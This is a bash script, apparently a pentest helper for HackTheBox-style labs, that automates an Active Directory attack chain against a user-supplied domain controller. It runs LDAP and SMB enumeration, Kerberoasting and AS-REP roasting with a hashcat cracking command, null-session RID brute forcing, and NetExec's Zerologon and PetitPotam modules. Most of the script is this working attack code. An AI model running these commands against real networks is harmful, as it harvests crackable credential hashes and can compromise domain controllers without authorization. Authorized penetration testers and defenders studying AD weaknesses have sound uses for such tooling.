#!/bin/bash
# Author: EmreKybs

RED='\033[0;31m'
BLUE='\033[0;34m'
GREEN='\033[0;32m'
NC='\033[0m' 


RED_LINE="${RED}================================================================================${NC}"

clear

frame_top_bottom="${GREEN}+----------------------------------+${NC}"

title="${GREEN}|${NC}${BLUE} ☠ AD-${NC}${GREEN}Security${NC}${RED}Audit ☠ ${NC}${GREEN}${NC}"

echo -e "$frame_top_bottom"
echo -e "$title"
echo -e "$frame_top_bottom"
read -p "Enter the domain (e.g., htb.local): " domain
read -p "Enter the Domain Controller IP (e.g., 10.0.2.13): " dc_ip

# Construct the domain components for ldapsearch
dc_string=$(echo $domain | sed 's/\./,dc=/g')
ldap_domain="dc=$dc_string"


# LDAP Search Command
ldap_cmd="ldapsearch -x -b \"$ldap_domain\" -H ldap://$dc_ip | grep -i service"

# Impacket GetUserSPNs Command
getuserspns_cmd="impacket-GetUserSPNs -request -dc-ip $dc_ip $domain/"

# Impacket GetNPUsers Command
getnpusers_cmd="impacket-GetNPUsers -request -dc-ip $dc_ip $domain/ -format hashcat -o $domain"

# Quietly enumerate an Active Directory Domain via LDAP parsing users, admins, groups, etc
silenthound_cmd="silenthound $dc_ip $domain -g -n -k --kerberoast"

# Enum4linux-ng enumeration
enum4linux_cmd="enum4linux-ng -A $dc_ip"

# RID Brute-Force command
rid_brute_cmd="netexec smb $dc_ip -u '' -p '' --rid-brute"

# Netexec All SMB Enumeration
netexec_cmd="netexec smb $dc_ip -u '' -p '' --users --groups --shares --pass-pol --local-auth"

# ZeroLogon
zerologon_cmd="nxc smb $dc_ip -u '' -p '' -M zerologon"

# PetitPotam
petitpatom_cmd="nxc smb $dc_ip -u '' -p '' -M petitpotam"


# Execute the commands with framed headings and descriptions
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|      +---LDAP Search---+          |${NC}"
echo -e "${BLUE}| This command searches the LDAP    |${NC}"
echo -e "${BLUE}| directory for entries that        |${NC}"
echo -e "${BLUE}| contain 'service', potentially    |${NC}"
echo -e "${BLUE}| identifying service accounts.     |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $ldap_cmd
echo -e "$RED_LINE"

# Execute GetUserSPNs command with explanation
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|       +---GetUserSPN---+          |${NC}"
echo -e "${BLUE}| This command requests Service     |${NC}"
echo -e "${BLUE}| Principal Names (SPNs) associated |${NC}"
echo -e "${BLUE}| with accounts, useful for finding |${NC}"
echo -e "${BLUE}| potential Kerberos ticket misuse. |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $getuserspns_cmd
echo -e "$RED_LINE"

# Execute Enum4linux-ng command with explanation
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|     +---Enum4linux-ng---+         |${NC}"
echo -e "${BLUE}| Running enum4linux-ng for a       |${NC}"
echo -e "${BLUE}| comprehensive scan of SMB, user   |${NC}"
echo -e "${BLUE}| accounts, and system info.        |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $enum4linux_cmd
echo -e "$RED_LINE"

# Execute GetNPUsers command with explanation
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|       +---GetNPUsers---+          |${NC}"
echo -e "${BLUE}| This command tries to list users  |${NC}"
echo -e "${BLUE}| that don't require Kerberos       |${NC}"
echo -e "${BLUE}| pre-authentication, allowing for  |${NC}"
echo -e "${BLUE}| potential offline cracking of     |${NC}"
echo -e "${BLUE}| their credentials.                |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $getnpusers_cmd

echo -e "${BLUE}YOU CAN USE! > hashcat -m 18200 -a 0 htb.local PasswordList.txt --force --status --potfile-disable ${NC}"
echo -e "$RED_LINE"

echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|     +---SilentHound---+           |${NC}"
echo -e "${BLUE}| This command runs the SilentHound |${NC}"
echo -e "${BLUE}| script for advanced Kerberos      |${NC}"
echo -e "${BLUE}| auditing and exploitation.        |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $silenthound_cmd
echo -e "$RED_LINE"

# Execute RID Brute-Force command with explanation
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|     +---RID Brute-Force---+       |${NC}"
echo -e "${BLUE}| This command attempts to          |${NC}"
echo -e "${BLUE}| enumerate user accounts on the    |${NC}"
echo -e "${BLUE}| target system via RID brute-      |${NC}"
echo -e "${BLUE}| forcing.                          |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $rid_brute_cmd
echo -e "$RED_LINE"

# Execute NetExec command with explanation
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|         +---NetExec---+           |${NC}"
echo -e "${BLUE}| This command uses NetExec to      |${NC}"
echo -e "${BLUE}| enumerate SMB details such as     |${NC}"
echo -e "${BLUE}| users, groups, shares, and        |${NC}"
echo -e "${BLUE}| password policy from the target   |${NC}"
echo -e "${BLUE}| Windows machine or domain         |${NC}"
echo -e "${BLUE}| controller.                       |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $netexec_cmd
echo -e "$RED_LINE"

# Execute Zerologon attack command with explanation
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|       +---Zerologon Attack---+    |${NC}"
echo -e "${BLUE}| This command attempts to exploit  |${NC}"
echo -e "${BLUE}| the Zerologon vulnerability in    |${NC}"
echo -e "${BLUE}| Windows Netlogon to reset the     |${NC}"
echo -e "${BLUE}| Domain Controller account         |${NC}"
echo -e "${BLUE}| passwords.                        |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $zerologon_cmd
echo -e "$RED_LINE"

# Execute PetitPotam attack command with explanation
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|       +---PetitPotam Attack---+   |${NC}"
echo -e "${BLUE}| This command uses the PetitPotam  |${NC}"
echo -e "${BLUE}| method to coerce Windows machines |${NC}"
echo -e "${BLUE}| into authenticating to a rogue    |${NC}"
echo -e "${BLUE}| NTLM server.                      |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $petitpatom_cmd
echo -e "$RED_LINE"

echo -e "${RED}All commands executed successfully.${NC}"
echo -e "${GREEN}Happy Hacking!${NC}"
